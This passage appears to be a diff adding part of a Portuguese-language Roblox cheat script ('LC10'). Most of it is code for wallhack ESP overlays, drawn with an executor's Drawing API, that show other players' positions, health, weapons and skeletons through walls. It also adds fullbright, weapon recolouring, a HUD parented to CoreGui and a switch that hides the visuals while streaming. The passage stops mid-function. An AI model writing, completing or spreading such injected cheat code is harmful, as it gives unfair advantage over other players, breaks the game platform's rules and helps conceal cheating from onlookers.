+        if atm and state.originalAtmFog then
+            atm.Density = state.originalAtmFog.Density
+            atm.Haze = state.originalAtmFog.Haze
+        end
+    end
+end
+
+function applyFullbright(on)
+    local state = _G.FxFPSState
+    if on then
+        state.originalFB = {
+            Ambient = Lighting.Ambient, OutdoorAmbient = Lighting.OutdoorAmbient,
+            Brightness = Lighting.Brightness, GlobalShadows = Lighting.GlobalShadows,
+        }
+        pcall(function()
+            Lighting.Ambient = Color3.fromRGB(200, 200, 200)
+            Lighting.OutdoorAmbient = Color3.fromRGB(200, 200, 200)
+            Lighting.Brightness = 4
+            Lighting.GlobalShadows = false
+        end)
+    else
+        for k, val in pairs(state.originalFB or {}) do
+            pcall(function() Lighting[k] = val end)
+        end
+    end
+end
+
+function applyNoShadows(on)
+    local state = _G.FxFPSState
+    if on then
+        state.shadowParts = {}
+        task.spawn(function()
+            for _, v in ipairs(workspace:GetDescendants()) do
+                if v:IsA("BasePart") and v.CastShadow then
+                    table.insert(state.shadowParts, v)
+                    v.CastShadow = false
+                end
+            end
+        end)
+    else
+        for _, v in ipairs(state.shadowParts or {}) do
+            pcall(function() v.CastShadow = true end)
+        end
+        state.shadowParts = {}
+    end
+end
+
+--=======================  CUSTOM ARMAS  =====================
+local COLOR_MAP = {
+    Vermelho = Color3.fromRGB(220, 40, 40),
+    Preto    = Color3.fromRGB(25, 25, 25),
+    Azul     = Color3.fromRGB(40, 100, 220),
+    Branco   = Color3.fromRGB(240, 240, 240),
+}
+local LINEB_DEFAULT_COLOR = Color3.fromRGB(255, 0, 0)
+local LINEB_COLOR_MAP = {
+    ["Cor padrão"]  = LINEB_DEFAULT_COLOR,
+    ["Azul escuro"] = Color3.fromRGB(10, 30, 90),
+    ["Azul"]        = Color3.fromRGB(40, 100, 220),
+    ["Preto"]       = Color3.fromRGB(25, 25, 25),
+}
+local PISTOL_SOUND_ID = "rbxassetid://18267120562"
+local SOUND_MAP = {
+    Rifle = { ["M4"] = "rbxassetid://96588836900463", ["TEC"] = "rbxassetid://77159732551316" },
+    Pistol = { ["POP"] = "rbxassetid://7158013361" },
+}
+local LINEB_DURATION = 2.5
+local CROSSHAIR_ASSET_ORIGINAL = "rbxassetid://3836629997"
+
+function isPistol(name)
+    name = name:lower()
+    return name:find("pistol") or name:find("jolland") or name:find("glock") or
+           name:find("usp") or name:find("deagle") or name:find("revolver") or
+           name:find("m1911") or name:find("p250") or name:find("handgun") or
+           name:find("sixshooter")
+end
+function isBufalo(name)
+    name = name:lower()
+    return name:find("bufalo") or name:find("buffalo")
+end
+function isFireSound(s)
+    local sN = s.Name:lower()
+    local match = (sN == "fire" or sN == "shoot" or sN == "shot"
+                   or sN:find("fire") or sN:find("shoot") or sN:find("shot"))
+    if not match then return false end
+    if sN:find("reload") or sN:find("equip") or sN:find("empty") or sN:find("dry") then return false end
+    return true
+end
+function resolveSoundId(weaponType)
+    if weaponType == "pistol" then
+        if C.Custom_PistolSound then return PISTOL_SOUND_ID, 0.8 end
+        if C.Custom_PistolAltSound and C.Custom_PistolAltSound ~= "Nenhum" then
+            local id = SOUND_MAP.Pistol[C.Custom_PistolAltSound]
+            if id then return id, 0.8 end
+        end
+    elseif weaponType == "rifle" then
+        if C.Custom_RifleSound and C.Custom_RifleSound ~= "Nenhum" then
+            local id = SOUND_MAP.Rifle[C.Custom_RifleSound]
+            if id then return id, 0.8 end
+        end
+    end
+    return nil, nil
+end
+
+function applyWeaponCustomization(weaponModel, targetColor, applyGlass)
+    if not weaponModel then return end
+    for _, d in ipairs(weaponModel:GetDescendants()) do
+        if d:IsA("BasePart") or d:IsA("MeshPart") then
+            if not originalWeaponState[d] then
+                originalWeaponState[d] = { Color = d.Color, Material = d.Material, Transparency = d.Transparency }
+            end
+            d.Color = targetColor
+            if applyGlass then
+                d.Material = Enum.Material.Glass
+                d.Transparency = 0.35
+            else
+                d.Material = Enum.Material.SmoothPlastic
+                d.Transparency = 0
+            end
+        end
+    end
+end
+
+function customAnyActive()
+    return C.Custom_RifleEnabled or C.Custom_PistolEnabled
+        or C.Custom_BufaloEnabled or C.Custom_Vidrom
+        or C.Custom_PistolSound
+        or (C.Custom_PistolAltSound and C.Custom_PistolAltSound ~= "Nenhum")
+        or (C.Custom_RifleSound and C.Custom_RifleSound ~= "Nenhum")
+end
+
+function processWeapons()
+    local char = LP.Character
+    if not char then return end
+    local containers = { char, LP:FindFirstChild("Backpack") }
+    local useGlass = C.Custom_Vidrom
+    for _, container in ipairs(containers) do
+        if container then
+            for _, item in ipairs(container:GetDescendants()) do
+                if item:IsA("Model") or item:IsA("Tool") then
+                    local n = item.Name
+                    local anyActive = false
+                    local weaponType = "rifle"
+                    if isBufalo(n) then weaponType = "bufalo"
+                    elseif isPistol(n) then weaponType = "pistol" end
+                    if weaponType == "bufalo" and C.Custom_BufaloEnabled then
+                        applyWeaponCustomization(item, COLOR_MAP[C.Custom_BufaloColor] or COLOR_MAP.Vermelho, useGlass)
+                        anyActive = true
+                    elseif weaponType == "pistol" and C.Custom_PistolEnabled then
+                        applyWeaponCustomization(item, COLOR_MAP[C.Custom_PistolColor] or COLOR_MAP.Vermelho, useGlass)
+                        anyActive = true
+                    elseif weaponType == "rifle" and C.Custom_RifleEnabled then
+                        applyWeaponCustomization(item, COLOR_MAP[C.Custom_RifleColor] or COLOR_MAP.Vermelho, useGlass)
+                        anyActive = true
+                    end
+                    if C.Custom_Vidrom and not anyActive then
+                        for _, d in ipairs(item:GetDescendants()) do
+                            if d:IsA("BasePart") or d:IsA("MeshPart") then
+                                if not originalWeaponState[d] then
+                                    originalWeaponState[d] = { Color = d.Color, Material = d.Material, Transparency = d.Transparency }
+                                end
+                                d.Material = Enum.Material.Glass
+                                d.Transparency = 0.35
+                            end
+                        end
+                    end
+                    if weaponType == "pistol" or weaponType == "rifle" then
+                        local targetId, targetVol = resolveSoundId(weaponType)
+                        for _, s in ipairs(item:GetDescendants()) do
+                            if s:IsA("Sound") and isFireSound(s) then
+                                if not processedSounds[s] then processedSounds[s] = s.SoundId end
+                                if targetId then
+                                    if s.SoundId ~= targetId then
+                                        s.SoundId = targetId
+                                        s.Volume = targetVol
+                                    end
+                                else
+                                    if s.SoundId ~= processedSounds[s] then
+                                        s.SoundId = processedSounds[s]
+                                        s.Volume = 0.5
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+
+function getActiveTracerColor()
+    return LINEB_COLOR_MAP[C.Custom_LineBColor] or LINEB_DEFAULT_COLOR
+end
+function processLineBTracer(objeto)
+    if not C.Custom_LineB then return end
+    local cor = getActiveTracerColor()
+    local seq = ColorSequence.new(cor)
+    local ehRastro = false
+    if objeto:IsA("Beam") then objeto.Color = seq ehRastro = true
+    elseif objeto:IsA("Trail") then objeto.Color = seq objeto.Lifetime = LINEB_DURATION ehRastro = true
+    elseif objeto:IsA("ParticleEmitter") then objeto.Color = seq objeto.Lifetime = NumberRange.new(LINEB_DURATION) ehRastro = true
+    elseif objeto:IsA("BasePart") then
+        local n = objeto.Name:lower()
+        if n:find("tracer") or n:find("bullet") or objeto.Material == Enum.Material.Neon then
+            objeto.Color = cor ehRastro = true
+        end
+    end
+    if ehRastro then
+        task.delay(0.05, function()
+            if C.Custom_LineB and objeto and objeto.Parent then Debris:AddItem(objeto, LINEB_DURATION) end
+        end)
+    end
+end
+function processLineBCrosshair(element)
+    if not C.Custom_LineB then return end
+    if element:IsA("ImageLabel") or element:IsA("ImageButton") then
+        if element.Image == CROSSHAIR_ASSET_ORIGINAL or tostring(element.Image):match("3836629997") then
+            element.ImageTransparency = 1
+            if not element:FindFirstChild("MiraCustomizadaLocal") then
+                local mira = Instance.new("ImageLabel")
+                mira.Name = "MiraCustomizadaLocal"
+                mira.Size = UDim2.new(1, 0, 1, 0)
+                mira.Position = UDim2.new(0, 0, 0, 0)
+                mira.BackgroundTransparency = 1
+                mira.Image = ""
+                local dot = Instance.new("Frame")
+                dot.Name = "PontoCentral"
+                dot.Size = UDim2.new(0, 4, 0, 4)
+                dot.Position = UDim2.new(0.5, -2, 0.5, -2)
+                dot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                dot.BorderSizePixel = 0
+                dot.Parent = mira
+                mira.Parent = element
+            end
+        end
+    end
+end
+
+workspace.DescendantAdded:Connect(function(d)
+    if C.Custom_LineB then task.spawn(processLineBTracer, d) end
+end)
+do
+    local pg = LP:WaitForChild("PlayerGui")
+    pg.DescendantAdded:Connect(function(d)
+        if C.Custom_LineB then processLineBCrosshair(d) end
+    end)
+end
+task.spawn(function()
+    while task.wait(0.25) do
+        if not hidden then
+            if customAnyActive() then pcall(processWeapons) end
+            if C.Custom_LineB then
+                local pg = LP:FindFirstChild("PlayerGui")
+                if pg then
+                    for _, d in ipairs(pg:GetDescendants()) do processLineBCrosshair(d) end
+                end
+            end
+        end
+    end
+end)
+
+--=======================  ESP  ==============================
+function removeESP(plr)
+    local d = espCache[plr]
+    if d then
+        if d.highlight then d.highlight:Destroy() end
+        if d.billboard then d.billboard:Destroy() end
+        espCache[plr] = nil
+    end
+end
+function createESP(plr)
+    if plr == LP then return end
+    local ch = plr.Character
+    if not ch then return end
+    local head = ch:FindFirstChild("Head")
+    if not head then return end
+    local hl = Instance.new("Highlight")
+    hl.Name = "LC10_ESP" hl.Adornee = ch hl.FillColor = C.ESPColor
+    hl.OutlineColor = Color3.fromRGB(255, 255, 255)
+    hl.FillTransparency = 0.55 hl.OutlineTransparency = 0.2
+    hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop hl.Parent = ch
+    local bb = Instance.new("BillboardGui")
+    bb.Name = "LC10_ESP_BB" bb.Adornee = head
+    bb.Size = UDim2.new(0, 240, 0, 70)
+    bb.StudsOffset = Vector3.new(0, 3, 0) bb.AlwaysOnTop = true bb.Parent = ch
+    local n = Instance.new("TextLabel")
+    n.Size = UDim2.new(1, 0, 0, 20) n.BackgroundTransparency = 1
+    n.Font = Enum.Font.GothamBold n.Text = plr.Name
+    n.TextColor3 = Color3.fromRGB(255, 255, 255) n.TextSize = 14
+    n.TextStrokeTransparency = 0.4 n.Parent = bb
+    local dd = Instance.new("TextLabel")
+    dd.Size = UDim2.new(1, 0, 0, 18) dd.Position = UDim2.new(0, 0, 0, 20)
+    dd.BackgroundTransparency = 1 dd.Font = Enum.Font.Gotham
+    dd.Text = "" dd.TextColor3 = Color3.fromRGB(210, 210, 210)
+    dd.TextSize = 12 dd.TextStrokeTransparency = 0.4 dd.Parent = bb
+    local w = Instance.new("TextLabel")
+    w.Size = UDim2.new(1, 0, 0, 16) w.Position = UDim2.new(0, 0, 0, 38)
+    w.BackgroundTransparency = 1 w.Font = Enum.Font.Gotham
+    w.Text = "" w.TextColor3 = Color3.fromRGB(255, 220, 100)
+    w.TextSize = 11 w.TextStrokeTransparency = 0.4 w.Parent = bb
+    espCache[plr] = { highlight = hl, billboard = bb, name = n, dist = dd, wpn = w }
+end
+function clearAllESP()
+    for plr, _ in pairs(espCache) do removeESP(plr) end
+end
+
+--=======================  DRAWINGS  =========================
+function newLine(c)
+    local l = Drawing.new("Line") l.Thickness = 1.5 l.Color = c l.Transparency = 1 l.Visible = false return l
+end
+function newBox(c) local t={} for i=1,4 do t[i]=newLine(c) end return t end
+function newRect(c)
+    local r = Drawing.new("Square") r.Thickness=2 r.Color=c r.Filled=false r.Transparency=1 r.Visible=false return r
+end
+function newFillRect(c)
+    local r = Drawing.new("Square") r.Filled=true r.Thickness=0 r.Color=c r.Transparency=0.25 r.Visible=false return r
+end
+function newText(c)
+    local t = Drawing.new("Text") t.Size=14 t.Center=true t.Outline=true t.Color=c t.Visible=false return t
+end
+
+local SKEL = {
+    {"Head","UpperTorso"},{"UpperTorso","LowerTorso"},
+    {"UpperTorso","LeftUpperArm"},{"LeftUpperArm","LeftLowerArm"},{"LeftLowerArm","LeftHand"},
+    {"UpperTorso","RightUpperArm"},{"RightUpperArm","RightLowerArm"},{"RightLowerArm","RightHand"},
+    {"LowerTorso","LeftUpperLeg"},{"LeftUpperLeg","LeftLowerLeg"},{"LeftLowerLeg","LeftFoot"},
+    {"LowerTorso","RightUpperLeg"},{"RightUpperLeg","RightLowerLeg"},{"RightLowerLeg","RightFoot"},
+}
+
+local boundsCache = {}
+function getBounds(ch, plr)
+    local cached = boundsCache[plr]
+    if cached and tick() - cached.t < 0.1 then
+        return cached.minX, cached.minY, cached.maxX, cached.maxY
+    end
+    local minX, minY = math.huge, math.huge
+    local maxX, maxY = -math.huge, -math.huge
+    local vis = false
+    for _, part in ipairs(ch:GetChildren()) do
+        if part:IsA("BasePart") then
+            local pos, on = Camera:WorldToViewportPoint(part.Position)
+            if on then
+                vis = true
+                local s = part.Size.Magnitude * 200 / (pos.Z + 1)
+                minX = math.min(minX, pos.X - s/2)
+                maxX = math.max(maxX, pos.X + s/2)
+                minY = math.min(minY, pos.Y - s/2)
+                maxY = math.max(maxY, pos.Y + s/2)
+            end
+        end
+    end
+    if not vis then return nil end
+    boundsCache[plr] = { minX = minX, minY = minY, maxX = maxX, maxY = maxY, t = tick() }
+    return minX, minY, maxX, maxY
+end
+
+task.spawn(function()
+    while task.wait(0.033) do
+        if hidden or streamHidden or not hasDrawing then continue end
+        if not (C.SkeletonESP or C.BoxESP or C.BoxV2ESP or C.TracerESP or C.ESPHealth) then continue end
+        for _, plr in ipairs(cachedPlayers) do
+            if plr == LP or not isAlive(plr) then
+                if skelCache[plr] then for _, l in ipairs(skelCache[plr]) do l.Visible = false end end
+                if boxCache[plr] then for _, l in ipairs(boxCache[plr]) do l.Visible = false end end
+                if boxV2Cache[plr] then boxV2Cache[plr].rect.Visible = false boxV2Cache[plr].fill.Visible = false end
+                if tracerCache[plr] then tracerCache[plr].Visible = false end
+                if hpCache[plr] then hpCache[plr].Visible = false end
+            else
+                local ch = plr.Character
+                local skip = C.ESPTeamCheck and sameTeam(LP, plr)
+                if C.SkeletonESP and not skip then
+                    if not skelCache[plr] then
+                        skelCache[plr] = {}
+                        for i = 1, #SKEL do skelCache[plr][i] = newLine(C.SkeletonColor) end
+                    end
+                    for i, pair in ipairs(SKEL) do
+                        local p1 = ch:FindFirstChild(pair[1])
+                        local p2 = ch:FindFirstChild(pair[2])
+                        local line = skelCache[plr][i]
+                        if p1 and p2 then
+                            local s1, on1 = Camera:WorldToViewportPoint(p1.Position)
+                            local s2, on2 = Camera:WorldToViewportPoint(p2.Position)
+                            if on1 and on2 then
+                                line.From = Vector2.new(s1.X, s1.Y)
+                                line.To = Vector2.new(s2.X, s2.Y)
+                                line.Color = C.SkeletonColor line.Visible = true
+                            else line.Visible = false end
+                        else line.Visible = false end
+                    end
+                elseif skelCache[plr] then
+                    for _, l in ipairs(skelCache[plr]) do l.Visible = false end
+                end
+                if C.BoxESP and not skip then
+                    if not boxCache[plr] then boxCache[plr] = newBox(C.BoxColor) end
+                    local x1, y1, x2, y2 = getBounds(ch, plr)
+                    if x1 then
+                        local L = boxCache[plr]
+                        L[1].From=Vector2.new(x1,y1) L[1].To=Vector2.new(x2,y1)
+                        L[2].From=Vector2.new(x2,y1) L[2].To=Vector2.new(x2,y2)
+                        L[3].From=Vector2.new(x2,y2) L[3].To=Vector2.new(x1,y2)
+                        L[4].From=Vector2.new(x1,y2) L[4].To=Vector2.new(x1,y1)
+                        for i=1,4 do L[i].Color=C.BoxColor L[i].Visible=true end
+                    else for i=1,4 do boxCache[plr][i].Visible=false end end
+                elseif boxCache[plr] then
+                    for _, l in ipairs(boxCache[plr]) do l.Visible = false end
+                end
+                if C.BoxV2ESP and not skip then
+                    if not boxV2Cache[plr] then
+                        boxV2Cache[plr] = { rect=newRect(C.BoxV2Color), fill=newFillRect(C.BoxV2Color) }
+                    end
+                    local x1, y1, x2, y2 = getBounds(ch, plr)
+                    if x1 then
+                        local r = boxV2Cache[plr].rect local f = boxV2Cache[plr].fill
+                        local w, h = x2-x1, y2-y1
+                        r.Position=Vector2.new(x1,y1) r.Size=Vector2.new(w,h) r.Color=C.BoxV2Color r.Visible=true
+                        f.Position=Vector2.new(x1,y1) f.Size=Vector2.new(w,h) f.Color=C.BoxV2Color f.Visible=true
+                    else boxV2Cache[plr].rect.Visible=false boxV2Cache[plr].fill.Visible=false end
+                elseif boxV2Cache[plr] then
+                    boxV2Cache[plr].rect.Visible = false boxV2Cache[plr].fill.Visible = false
+                end
+                if C.TracerESP and not skip then
+                    if not tracerCache[plr] then tracerCache[plr] = newLine(C.TracerColor) end
+                    local head = ch:FindFirstChild("Head")
+                    if head then
+                        local sp, on = Camera:WorldToViewportPoint(head.Position)
+                        if on then
+                            tracerCache[plr].From = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y)
+                            tracerCache[plr].To = Vector2.new(sp.X, sp.Y)
+                            tracerCache[plr].Color = C.TracerColor tracerCache[plr].Visible = true
+                        else tracerCache[plr].Visible = false end
+                    end
+                elseif tracerCache[plr] then tracerCache[plr].Visible = false end
+                if C.ESPHealth and not skip then
+                    if not hpCache[plr] then hpCache[plr] = newText(Color3.fromRGB(80,255,80)) end
+                    local hum = ch:FindFirstChildOfClass("Humanoid")
+                    local head = ch:FindFirstChild("Head")
+                    if hum and head then
+                        local sp, on = Camera:WorldToViewportPoint(head.Position + Vector3.new(0, 2.5, 0))
+                        if on then
+                            hpCache[plr].Text = string.format("%d HP", math.floor(hum.Health))
+                            hpCache[plr].Position = Vector2.new(sp.X, sp.Y)
+                            hpCache[plr].Color = hum.Health > 50 and Color3.fromRGB(80,255,80)
+                                              or hum.Health > 20 and Color3.fromRGB(255,220,80)
+                                              or Color3.fromRGB(255,60,60)
+                            hpCache[plr].Visible = true
+                        else hpCache[plr].Visible = false end
+                    end
+                elseif hpCache[plr] then hpCache[plr].Visible = false end
+            end
+        end
+    end
+end)
+task.spawn(function()
+    while task.wait(0.1) do
+        if hidden or streamHidden then
+            if next(espCache) then clearAllESP() end
+            continue
+        end
+        if not C.ESP then
+            if next(espCache) then clearAllESP() end
+            continue
+        end
+        for _, plr in ipairs(cachedPlayers) do
+            if plr ~= LP and isAlive(plr) then
+                if C.ESPTeamCheck and sameTeam(LP, plr) then removeESP(plr) continue end
+                if not espCache[plr] or not espCache[plr].highlight then
+                    removeESP(plr) createESP(plr)
+                end
+                local d = espCache[plr]
+                if d then
+                    if d.highlight then d.highlight.FillColor = C.ESPColor end
+                    if d.name then d.name.Visible = C.ESPNames d.name.Text = plr.Name end
+                    if d.dist then
+                        if C.ESPDist then
+                            local root = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
+                            if root then
+                                local dd = (root.Position - cachedMyPos).Magnitude
+                                d.dist.Text = string.format("[%d studs]", math.floor(dd))
+                                d.dist.Visible = true
+                            end
+                        else d.dist.Visible = false end
+                    end
+                    if d.wpn then
+                        if C.ESPWeapon then
+                            local tool = plr.Character and plr.Character:FindFirstChildOfClass("Tool")
+                            d.wpn.Text = tool and tool.Name or ""
+                            d.wpn.Visible = true
+                        else d.wpn.Visible = false end
+                    end
+                end
+            else removeESP(plr) end
+        end
+    end
+end)
+
+Players.PlayerRemoving:Connect(function(plr)
+    removeESP(plr)
+    boundsCache[plr] = nil
+    if skelCache[plr] then for _, l in ipairs(skelCache[plr]) do l:Remove() end skelCache[plr] = nil end
+    if boxCache[plr] then for _, l in ipairs(boxCache[plr]) do l:Remove() end boxCache[plr] = nil end
+    if boxV2Cache[plr] then boxV2Cache[plr].rect:Remove() boxV2Cache[plr].fill:Remove() boxV2Cache[plr] = nil end
+    if tracerCache[plr] then tracerCache[plr]:Remove() tracerCache[plr] = nil end
+    if hpCache[plr] then hpCache[plr]:Remove() hpCache[plr] = nil end
+end)
+
+--=======================  HUD (controlado pelo site)  =======
+function buildHUD()
+    local g = Instance.new("ScreenGui")
+    g.Name = "LC10HUD"
+    g.ResetOnSpawn = false
+    g.IgnoreGuiInset = true
+    g.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    g.DisplayOrder = 998
+    pcall(function() g.Parent = game:GetService("CoreGui") end)
+    if not g.Parent then g.Parent = LP:WaitForChild("PlayerGui") end
+    hudState.gui = g
+    _G.FxHudGui = g
+
+    local ch = Instance.new("Frame")
+    ch.Name = "Crosshair"
+    ch.AnchorPoint = Vector2.new(0.5, 0.5)
+    ch.Position = UDim2.new(0.5, 0, 0.5, 0)
+    ch.Size = UDim2.fromOffset(60, 60)
+    ch.BackgroundTransparency = 1
+    ch.Visible = false
+    ch.Parent = g
+    hudState.crosshair = ch
+
+    local hLine = Instance.new("Frame")
+    hLine.AnchorPoint = Vector2.new(0.5, 0.5)
+    hLine.Position = UDim2.new(0.5, 0, 0.5, 0)
+    hLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    hLine.BorderSizePixel = 0
+    hLine.Parent = ch
+    hudState.xH = hLine
+
+    local vLine = Instance.new("Frame")
+    vLine.AnchorPoint = Vector2.new(0.5, 0.5)
+    vLine.Position = UDim2.new(0.5, 0, 0.5, 0)
+    vLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    vLine.BorderSizePixel = 0
+    vLine.Parent = ch
+    hudState.xV = vLine
+
+    local dot = Instance.new("Frame")
+    dot.AnchorPoint = Vector2.new(0.5, 0.5)
+    dot.Position = UDim2.new(0.5, 0, 0.5, 0)
+    dot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    dot.BorderSizePixel = 0
+    dot.Parent = ch
+    local dotC = Instance.new("UICorner") dotC.CornerRadius = UDim.new(1, 0) dotC.Parent = dot
+    hudState.xDot = dot
+
+    local circle = Instance.new("Frame")
+    circle.AnchorPoint = Vector2.new(0.5, 0.5)
+    circle.Position = UDim2.new(0.5, 0, 0.5, 0)
+    circle.BackgroundTransparency = 1
+    circle.Parent = ch
+    local circleC = Instance.new("UICorner") circleC.CornerRadius = UDim.new(1, 0) circleC.Parent = circle
+    local circleS = Instance.new("UIStroke") circleS.Color = Color3.fromRGB(255, 255, 255) circleS.Thickness = 2 circleS.Parent = circle
+    hudState.xCircle = circle
+    hudState.xCircleStroke = circleS
+
+    local infoPanel = Instance.new("Frame")
+    infoPanel.Name = "InfoPanel"
+    infoPanel.Size = UDim2.new(0, 170, 0, 24)
+    infoPanel.BackgroundColor3 = Color3.fromRGB(15, 16, 20)
+    infoPanel.BackgroundTransparency = 0.35
+    infoPanel.BorderSizePixel = 0
+    infoPanel.AutomaticSize = Enum.AutomaticSize.Y
+    infoPanel.Visible = false
+    infoPanel.Parent = g
+    local ipC = Instance.new("UICorner") ipC.CornerRadius = UDim.new(0, 6) ipC.Parent = infoPanel
+    local ipS = Instance.new("UIStroke") ipS.Color = Color3.fromRGB(48, 52, 65) ipS.Thickness = 1 ipS.Transparency = 0.5 ipS.Parent = infoPanel
+    local ipPad = Instance.new("UIPadding")
+    ipPad.PaddingTop = UDim.new(0, 6) ipPad.PaddingBottom = UDim.new(0, 6)
+    ipPad.PaddingLeft = UDim.new(0, 10) ipPad.PaddingRight = UDim.new(0, 10)
+    ipPad.Parent = infoPanel
+    local ipList = Instance.new("UIListLayout")
+    ipList.Padding = UDim.new(0, 2) ipList.SortOrder = Enum.SortOrder.LayoutOrder ipList.Parent = infoPanel
+    hudState.infoPanel = infoPanel
+
+    local function mkLbl(order)
+        local l = Instance.new("TextLabel")
+        l.Size = UDim2.new(1, 0, 0, 16)
+        l.BackgroundTransparency = 1
+        l.Font = Enum.Font.Code
+        l.TextSize = 12
+        l.TextColor3 = Color3.fromRGB(235, 238, 245)
+        l.TextXAlignment = Enum.TextXAlignment.Left
+        l.Text = ""
+        l.LayoutOrder = order
+        l.Parent = infoPanel
+        return l
+    end
+    hudState.fpsLbl = mkLbl(1) hudState.pingLbl = mkLbl(2) hudState.ramLbl = mkLbl(3)
+    hudState.playersLbl = mkLbl(4) hudState.coordsLbl = mkLbl(5) hudState.timeLbl = mkLbl(6)
+
+    local hbBg = Instance.new("Frame")
+    hbBg.Name = "HealthBg"
+    hbBg.AnchorPoint = Vector2.new(0.5, 1)
+    hbBg.Position = UDim2.new(0.5, 0, 1, -80)
+    hbBg.Size = UDim2.new(0, 220, 0, 20)
+    hbBg.BackgroundColor3 = Color3.fromRGB(15, 16, 20)
+    hbBg.BackgroundTransparency = 0.25
+    hbBg.BorderSizePixel = 0
+    hbBg.Visible = false
+    hbBg.Parent = g
+    local hbC = Instance.new("UICorner") hbC.CornerRadius = UDim.new(1, 0) hbC.Parent = hbBg
+    local hbS = Instance.new("UIStroke") hbS.Color = Color3.fromRGB(48, 52, 65) hbS.Thickness = 1 hbS.Transparency = 0.5 hbS.Parent = hbBg
+
+    local hbFill = Instance.new("Frame")
+    hbFill.Position = UDim2.new(0, 2, 0, 2)
+    hbFill.Size = UDim2.new(0.5, -4, 1, -4)
+    hbFill.BackgroundColor3 = Color3.fromRGB(80, 220, 120)
+    hbFill.BorderSizePixel = 0
+    hbFill.Parent = hbBg
+    local hbFC = Instance.new("UICorner") hbFC.CornerRadius = UDim.new(1, 0) hbFC.Parent = hbFill
+
+    local hbLbl = Instance.new("TextLabel")
+    hbLbl.Size = UDim2.new(1, 0, 1, 0)
+    hbLbl.BackgroundTransparency = 1
+    hbLbl.Font = Enum.Font.GothamBold
+    hbLbl.TextSize = 12
+    hbLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+    hbLbl.TextStrokeTransparency = 0.5
+    hbLbl.Text = "100 / 100"
+    hbLbl.ZIndex = 2
+    hbLbl.Parent = hbBg
+    hudState.healthBar = hbFill
+    hudState.healthBarBg = hbBg
+    hudState.healthLbl = hbLbl
+
+    local wm = Instance.new("TextLabel")
+    wm.Name = "Watermark"
+    wm.AnchorPoint = Vector2.new(0.5, 0)
+    wm.Position = UDim2.new(0.5, 0, 0, 8)
+    wm.Size = UDim2.new(0, 300, 0, 26)
+    wm.BackgroundColor3 = Color3.fromRGB(15, 16, 20)
+    wm.BackgroundTransparency = 0.3
+    wm.BorderSizePixel = 0
+    wm.Font = Enum.Font.GothamBold
+    wm.TextSize = 13
+    wm.TextColor3 = Color3.fromRGB(240, 240, 250)
+    wm.Text = "LC10 • WB  |  " .. LP.Name
+    wm.Visible = false
+    wm.Parent = g
+    local wmC = Instance.new("UICorner") wmC.CornerRadius = UDim.new(0, 6) wmC.Parent = wm
+    local wmS = Instance.new("UIStroke") wmS.Color = Color3.fromRGB(48, 52, 65) wmS.Thickness = 1 wmS.Transparency = 0.5 wmS.Parent = wm
+    hudState.watermark = wm
+end
+
+buildHUD()
+
+function applyInfoPanelPos()
+    if not hudState.infoPanel then return end
+    local pos = C.HUD_InfoPos
+    if pos == "Top Esquerda" then
+        hudState.infoPanel.AnchorPoint = Vector2.new(0, 0)
+        hudState.infoPanel.Position = UDim2.new(0, 10, 0, 60)
+    elseif pos == "Top Direita" then
+        hudState.infoPanel.AnchorPoint = Vector2.new(1, 0)
+        hudState.infoPanel.Position = UDim2.new(1, -10, 0, 60)
+    elseif pos == "Baixo Esquerda" then
+        hudState.infoPanel.AnchorPoint = Vector2.new(0, 1)
+        hudState.infoPanel.Position = UDim2.new(0, 10, 1, -60)
+    elseif pos == "Baixo Direita" then
+        hudState.infoPanel.AnchorPoint = Vector2.new(1, 1)
+        hudState.infoPanel.Position = UDim2.new(1, -10, 1, -60)
+    end
+end
+function applyHealthBarPos()
+    if not hudState.healthBarBg then return end
+    local pos = C.HUD_HealthPos
+    if pos == "Baixo" then
+        hudState.healthBarBg.AnchorPoint = Vector2.new(0.5, 1)
+        hudState.healthBarBg.Position = UDim2.new(0.5, 0, 1, -80)
+    elseif pos == "Cima" then
+        hudState.healthBarBg.AnchorPoint = Vector2.new(0.5, 0)
+        hudState.healthBarBg.Position = UDim2.new(0.5, 0, 0, 80)
+    elseif pos == "Centro" then
+        hudState.healthBarBg.AnchorPoint = Vector2.new(0.5, 0.5)
+        hudState.healthBarBg.Position = UDim2.new(0.5, 0, 0.5, 60)
+    end
+end
+function applyCrosshair()
+    if not hudState.crosshair then return end
+    local style = C.HUD_CrosshairStyle
+    local size = C.HUD_CrosshairSize
+    local thick = C.HUD_CrosshairThick
+    local dotSize = C.HUD_CrosshairDot
+    local col = C.HUD_CrosshairColor
+    hudState.crosshair.Visible = C.HUD_Crosshair
+    if not C.HUD_Crosshair then return end
+    local showH = style == "Cruz" or style == "Cruz + Ponto"
+    local showV = style == "Cruz" or style == "Cruz + Ponto"
+    local showDot = style == "Ponto" or style == "Cruz + Ponto"
+    local showCircle = style == "Círculo"
+    hudState.xH.Visible = showH hudState.xH.BackgroundColor3 = col hudState.xH.Size = UDim2.fromOffset(size * 2, thick)
+    hudState.xV.Visible = showV hudState.xV.BackgroundColor3 = col hudState.xV.Size = UDim2.fromOffset(thick, size * 2)
+    hudState.xDot.Visible = showDot hudState.xDot.BackgroundColor3 = col hudState.xDot.Size = UDim2.fromOffset(dotSize, dotSize)
+    hudState.xCircle.Visible = showCircle hudState.xCircle.Size = UDim2.fromOffset(size * 2, size * 2)
+    hudState.xCircleStroke.Color = col hudState.xCircleStroke.Thickness = thick
+end
+function setHideDefaultHUD(on)
+    local pg = LP:FindFirstChild("PlayerGui")
+    if not pg then return end
+    if on then
+        hiddenHUD = {}
+        for _, gui in ipairs(pg:GetChildren()) do
+            if gui:IsA("ScreenGui") and not gui.Name:find("LC10") then
+                if gui.Enabled then table.insert(hiddenHUD, gui) gui.Enabled = false end
+            end
+        end
+    else
+        for _, gui in ipairs(hiddenHUD) do pcall(function() gui.Enabled = true end) end
+        hiddenHUD = {}
+    end
+end
+function setHideGameElem(name, on)
+    local pg = LP:FindFirstChild("PlayerGui")
+    if not pg then return end
+    local el = pg:FindFirstChild(name)
+    if el then el.Enabled = not on end
+end
+function getPing()
+    local ok, ping = pcall(function()
